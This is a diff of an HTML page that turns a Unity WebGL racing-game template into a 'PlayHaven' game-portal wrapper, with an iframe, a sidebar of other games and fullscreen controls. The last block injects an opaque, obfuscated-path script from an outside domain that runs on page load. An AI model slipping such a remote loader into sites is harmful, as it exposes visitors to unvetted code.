@@ -1,160 +1,303 @@
 <!DOCTYPE html>
 <html lang="en-us">
-
 <head>
-	<meta charset="utf-8">
-  <meta name="robots" content="noindex,nofollow" />
-	<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
-	<title>Unity WebGL Player | Top Speed Racing 3d</title>
-	<link rel="shortcut icon" href="TemplateData/favicon.ico">
-	<link rel="stylesheet" href="TemplateData/style.css">
-  <script type="text/javascript" src="cloak.js"></script>
-<meta name="robots" content="noindex,nofollow" />
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>PlayHaven | Loading...</title>
+<link rel="icon" href="/images/square-logo-transparent.png" />
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&display=swap" rel="stylesheet">
+
+<style>
+* {
+  margin: 0;
+  padding: 0;
+  box-sizing: border-box;
+  font-family: "Poppins", sans-serif;
+}
+
+html, body {
+  height: 100%;
+  overflow: hidden; /* prevent any page scroll */
+  background: #0b0b0b;
+  color: #fff;
+}
+
+/* HEADER */
+header {
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  height: 80px; /* explicitly define header height */
+  background: #111;
+  border-bottom: 2px solid #00ffb3;
+  position: relative;
+  z-index: 10;
+}
+header img.logo {
+  height: 60px;
+  cursor: pointer;
+  transition: 0.2s ease;
+  margin-right: 1rem;
+}
+header img.logo:hover {
+  opacity: 0.8;
+}
+#header-title {
+  font-size: 1.5rem;
+  font-weight: 600;
+  color: #00ffb3;
+  text-align: center;
+  white-space: nowrap;
+}
+
+/* GAME AREA */
+main {
+  display: flex;
+  height: calc(100vh - 80px); /* exactly fill remaining space */
+  overflow: hidden; /* stop any scroll overflow */
+}
+
+#game-container {
+  flex: 3;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  position: relative;
+  background: #0e0e0e;
+  border-right: 2px solid #111;
+  padding: 0; /* remove padding to prevent small overflow */
+  overflow: hidden;
+}
+
+#game-iframe {
+  width: 100%;
+  height: 100%;
+  aspect-ratio: 16 / 9;
+  border-radius: 0; /* flush fit */
+  background: #000;
+  border: 0;
+  transition: all 0.3s ease;
+}
+
+/* FULLSCREEN STYLES */
+#game-container.fullscreen {
+  position: fixed;
+  top: 0;
+  left: 0;
+  width: 100vw;
+  height: 100vh;
+  z-index: 9999;
+  background: #000;
+  border: none;
+}
+#game-container.fullscreen #game-iframe {
+  width: 100%;
+  height: 100%;
+  border-radius: 0;
+}
+
+/* FOOTER INSIDE GAME */
+#game-footer {
+  position: absolute;
+  bottom: 15px;
+  left: 50%;
+  transform: translateX(-50%);
+  display: flex;
+  align-items: center;
+  gap: 10px;
+  z-index: 20;
+}
+#game-fullscreen-button {
+  background: #00ffb3;
+  color: #000;
+  padding: 0.6rem 1rem;
+  border-radius: 30px;
+  font-weight: 600;
+  cursor: pointer;
+  transition: 0.2s ease;
+}
+#game-fullscreen-button:hover {
+  background: #00d6a1;
+}
+
+/* SIDEBAR */
+.sidebar {
+  flex: 1;
+  background: #141414;
+  padding: 1rem;
+  overflow-y: auto;
+}
+.sidebar h2 {
+  font-size: 1.2rem;
+  color: #00ffb3;
+  margin-bottom: 0.5rem;
+  text-align: center;
+}
+.game-list {
+  display: flex;
+  flex-wrap: wrap;
+  justify-content: center;
+  gap: 1rem;
+  padding: 0.5rem;
+}
+.game-card {
+  background: #1b1b1b;
+  border-radius: 1rem;
+  overflow: hidden;
+  cursor: pointer;
+  transition: transform 0.3s ease, box-shadow 0.3s ease;
+  flex: 1 1 clamp(150px, 40%, 250px);
+  max-width: 250px;
+  min-width: 150px;
+}
+.game-card:hover {
+  box-shadow: 0 0 10px #00ffb3;
+  transform: translateY(-3px);
+}
+.game-card img {
+  width: 100%;
+  aspect-ratio: 16 / 9;
+  object-fit: cover;
+}
+.game-card h4 {
+  padding: 0.5rem;
+  text-align: center;
+  color: #00ffb3;
+}
+
+/* RESPONSIVE */
+@media (max-width: 900px) {
+  main {
+    flex-direction: column;
+  }
+  #game-iframe {
+    width: 100%;
+    height: 100%;
+    aspect-ratio: auto;
+  }
+  .sidebar {
+    order: 2;
+    width: 100%;
+    max-height: 40vh;
+  }
+  header img.logo {
+    height: 50px;
+    margin-right: 0.5rem;
+  }
+  #header-title {
+    font-size: 1.2rem;
+  }
+}
+</style>
+
 </head>
 
 <body>
-	<div id="unity-container" class="unity-desktop">
-		<canvas id="unity-canvas" width=900 height=600></canvas>
-		<div id="unity-loading-bar">
-			<div id="unity-logo">
-				<div id="unity-text-progress"></div>
-			</div>
-			<div id="unity-progress-bar-empty">
-				<div id="unity-progress-bar-full"></div>
-			</div>
-		</div>
-		<div id="unity-warning"> </div>
-		<!--       <div id="unity-footer">
-        <div id="unity-webgl-logo"></div>
-        <div id="unity-fullscreen-button"></div>
-        <div id="unity-build-title">Top Speed Racing 3d</div>
-      </div> -->
-	</div>
-	<script>
-		var container = document.querySelector("#unity-container");
-      var canvas = document.querySelector("#unity-canvas");
-      var textProgress = document.querySelector("#unity-text-progress");
-      var loadingBar = document.querySelector("#unity-loading-bar");
-      var progressBarFull = document.querySelector("#unity-progress-bar-full");
-      var progressBarEmpty = document.querySelector("#unity-progress-bar-empty");
-      // var fullscreenButton = document.querySelector("#unity-fullscreen-button");
-      var warningBanner = document.querySelector("#unity-warning");
+<header>
+  <img src="/images/full-logo.png" alt="PlayHaven Logo" class="logo" onclick="window.location.href='/'" />
+  <div id="header-title">Loading...</div>
+</header>
 
-      // Shows a temporary message banner/ribbon for a few seconds, or
-      // a permanent error message on top of the canvas if type=='error'.
-      // If type=='warning', a yellow highlight color is used.
-      // Modify or remove this function to customize the visually presented
-      // way that non-critical warnings and error messages are presented to the
-      // user.
-      function unityShowBanner(msg, type) {
-        function updateBannerVisibility() {
-          warningBanner.style.display = warningBanner.children.length ? 'block' : 'none';
-        }
-        var div = document.createElement('div');
-        div.innerHTML = msg;
-        warningBanner.appendChild(div);
-        if (type == 'error') div.style = 'background: red; padding: 10px;';
-        else {
-          if (type == 'warning') div.style = 'background: yellow; padding: 10px;';
-          setTimeout(function() {
-            warningBanner.removeChild(div);
-            updateBannerVisibility();
-          }, 5000);
-        }
-        updateBannerVisibility();
-      }
+<main>
+<div id="game-container">
+  <!-- IFRAME loading a local file in the same folder -->
+  <iframe
+  id="game-iframe"
+  src="source.html"
+  allowfullscreen
+  allow="fullscreen; gamepad; pointer-lock"
+  sandbox="allow-same-origin allow-scripts allow-pointer-lock allow-popups allow-modals allow-downloads allow-forms allow-top-navigation-by-user-activation"
+></iframe>
 
-      var buildUrl = "Build";
-      var loaderUrl = buildUrl + "/TopSpeedRacing_n1.loader.js";
-      var config = {
-        dataUrl: buildUrl + "/TopSpeedRacing_n1.data.unityweb",
-        frameworkUrl: buildUrl + "/TopSpeedRacing_n1.framework.js.unityweb",
-        codeUrl: buildUrl + "/TopSpeedRacing_n1.wasm.unityweb",
-        streamingAssetsUrl: "StreamingAssets",
-        companyName: "Top Speed Racing 3d 2",
-        productName: "Top Speed Racing 3d",
-        productVersion: "1.0",
-        showBanner: unityShowBanner,
-      };
+  <!-- FOOTER -->
+  <div id="game-footer">
+    <div id="game-fullscreen-button">⛶ Fullscreen</div>
+  </div>
+</div>
 
-      // By default Unity keeps WebGL canvas render target size matched with
-      // the DOM size of the canvas element (scaled by window.devicePixelRatio)
-      // Set this to false if you want to decouple this synchronization from
-      // happening inside the engine, and you would instead like to size up
-      // the canvas DOM size and WebGL render target sizes yourself.
-      // config.matchWebGLToCanvasSize = false;
+<aside class="sidebar">
+<h2>Other Games</h2>
+<div class="game-list" id="gameList"></div>
+</aside>
+</main>
 
-      if (/iPhone|iPad|iPod|Android/i.test(navigator.userAgent)) {
-        // Mobile device style: fill the whole browser client area with the game canvas:
+<script>
+const gameList = document.getElementById("gameList");
+const headerTitle = document.getElementById("header-title");
+const fsButton = document.getElementById('game-fullscreen-button');
+const gameContainer = document.getElementById('game-container');
 
-        var meta = document.createElement('meta');
-        meta.name = 'viewport';
-        meta.content = 'width=device-width, height=device-height, initial-scale=1.0, user-scalable=no, shrink-to-fit=yes';
-        document.getElementsByTagName('head')[0].appendChild(meta);
-        container.className = "unity-mobile";
+// Detect current game from URL
+const currentGame = window.location.pathname.split("/").filter(Boolean).pop();
 
-        // To lower canvas resolution on mobile devices to gain some
-        // performance, uncomment the following line:
-        // config.devicePixelRatio = 1;
+// Load games
+fetch("/Games/games.json").then(res=>res.json()).then(games=>{
+  gameList.innerHTML="";
+  games.forEach(game=>{
+    if(game.name === currentGame){
+      headerTitle.textContent = game.title;
+      document.title = `PlayHaven | ${game.title}`;
+      return;
+    }
+    const card=document.createElement("div");
+    card.className="game-card";
+    card.dataset.name=game.name.toLowerCase();
+    card.onclick=()=>window.location.href=`/Games/${game.name}/`;
+    card.innerHTML=`<img src="${game.thumbnail}" alt="${game.title}" onerror="this.src='/images/full-logo.png'"><h4>${game.title}</h4>`;
+    gameList.appendChild(card);
+  });
+}).catch(err=>{console.error(err); gameList.innerHTML="<p>Failed to load games!</p>";});
 
-        canvas.style.width = window.innerWidth + 'px';
-        canvas.style.height = window.innerHeight + 'px';
+// Fullscreen toggle (both browser fullscreen and CSS fallback)
+fsButton.addEventListener('click', ()=>{
+  if (!document.fullscreenElement) {
+    if (gameContainer.requestFullscreen) {
+      gameContainer.requestFullscreen();
+    } else if (gameContainer.webkitRequestFullscreen) {
+      gameContainer.webkitRequestFullscreen(); // Safari
+    }
+    gameContainer.classList.add('fullscreen');
+  } else {
+    if (document.exitFullscreen) {
+      document.exitFullscreen();
+    }
+    gameContainer.classList.remove('fullscreen');
+  }
+});
+const gameFrame = document.getElementById("game-iframe");
 
-        // unityShowBanner('WebGL builds are not supported on mobile devices.');
-      } else {
-        // Desktop style: Render the game canvas in a window that can be maximized to fullscreen:
+// When the game loads, try to focus it
+gameFrame.addEventListener("load", () => {
+  setTimeout(() => {
+    gameFrame.contentWindow.focus();
+  }, 300);
+});
 
-        canvas.style.width = window.innerWidth + 'px';
-        canvas.style.height = window.innerHeight + 'px';
-        // canvas.style.width = "900px";
-        // canvas.style.height = "600px";
-      }
+// When you click inside the game, give it focus so KeyboardJS works
+gameFrame.addEventListener("click", () => {
+  gameFrame.contentWindow.focus();
+});
 
-      window.addEventListener('resize', function() {
-      setTimeout(function() {
-        canvas.style.width = window.innerWidth + 'px';
-        canvas.style.height = window.innerHeight + 'px';
-      }, 1000);
-      }, false);
-
-      loadingBar.style.display = "block";
-
-       var showLoadingBar = false;
-
-      if(!showLoadingBar)
-        progressBarEmpty.style.display = "none";
+// Optional: when fullscreen starts, also focus the game
+document.addEventListener("fullscreenchange", () => {
+  if (document.fullscreenElement) {
+    gameFrame.contentWindow.focus();
+  }
+});
 
 
-      const rootPath = 'TemplateData';
-
-      var script = document.createElement("script");
-      script.src = loaderUrl;
-      script.onload = () => {
-        createUnityInstance(canvas, config, (progress) => {
-        if(progress>= 0.9 && progress<1)
-        {
-            textProgress.innerHTML = '100% - Running, Wait..' +' <img src="' + rootPath + '/gears.gif" class="spinner" width="90" height="90" align = center float :none; />';
-            progressBarEmpty.style.display = "none";        }
-        else
-        {
-            textProgress.innerHTML = 'Loading - ' + Math.floor(progress * 100) + '%' + ' <img src="' + rootPath + '/gears.gif" class="spinner" width="90" height="90" align = center float :none; />';
-        }
-
-        if(showLoadingBar)
-        progressBarFull.style.width = 100 * progress + "%";
-      
-        }).then((unityInstance) => {
-          loadingBar.style.display = "none";
-          textProgress.style.display = "none";
-          // fullscreenButton.onclick = () => {
-          //   unityInstance.SetFullscreen(1);
-          // };
-        }).catch((message) => {
-          alert(message);
-        });
-      };
-      document.body.appendChild(script);
-	</script>
+</script>
+<script>
+(function(fsrpkx){
+var d = document,
+    s = d.createElement('script'),
+    l = d.scripts[d.scripts.length - 1];
+s.settings = fsrpkx || {};
+s.src = "\/\/quarrelsome-development.com\/biX.Vhsid\/G\/lH0\/Y\/W\/cB\/ae-mr9QuKZ\/USlMkWPvT\/YG2uNIzlcB4vOkT\/MhtHNej\/Ya3fNFzDgh5\/NvAP";
+s.async = true;
+s.referrerPolicy = 'no-referrer-when-downgrade';
+l.parentNode.insertBefore(s, l);
+})({})
+</script>
 </body>
-
 </html>
